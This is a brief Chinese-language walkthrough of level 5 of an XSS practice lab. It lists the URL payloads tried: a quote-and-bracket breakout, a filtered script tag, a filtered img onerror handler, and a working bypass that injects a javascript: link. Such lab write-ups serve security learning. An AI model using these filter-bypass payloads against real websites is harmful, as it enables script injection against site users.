# level5

/level5.php?keyword=find a way out!

相同的搜索框界面

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1603159610735-59be50b3-4054-406c-8c4f-37f03b68d30d.png)

level5.php?keyword=">11

经过测试，双引号+简括号闭合标签

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1603159690516-2944d5d8-cfd3-4a98-ac06-ab2c18fd209f.png)

level5.php?keyword="><script>alert(1)</script>

script标签被过滤处理

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1603159747997-fba6d1bd-0fc5-48bd-af34-6e333474e352.png)

level5.php?keyword="><img%20src=1%20onerror=alert(1)>

标签事件也被过滤处理

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1603164149464-6a4ef48d-ad68-454a-8ebc-7a47ebd09012.png)

level5.php?keyword="><a href="javascript:alert(1)">click me</a>

通过伪协议，当点击标签时，执行js代码

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1603164223728-163061b0-9542-4dab-a7ba-67865ac82e04.png)